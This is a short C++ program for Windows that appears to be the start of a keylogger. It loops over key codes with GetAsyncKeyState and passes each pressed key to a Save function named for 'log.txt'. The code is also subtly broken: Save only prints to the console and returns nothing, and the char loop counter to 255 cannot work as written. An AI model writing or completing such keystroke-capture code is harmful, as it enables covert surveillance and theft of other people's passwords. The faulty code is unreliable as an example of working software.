#include <iostream>
#include <Windows.h>

using namespace std;

int Save(int _key, char *file);

int main() {
	char i;
	while (true) {
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, "log.txt");
			}
		}
	}
	return 0;
}
int Save(int _key, char *file) {
	cout << _key << endl;

}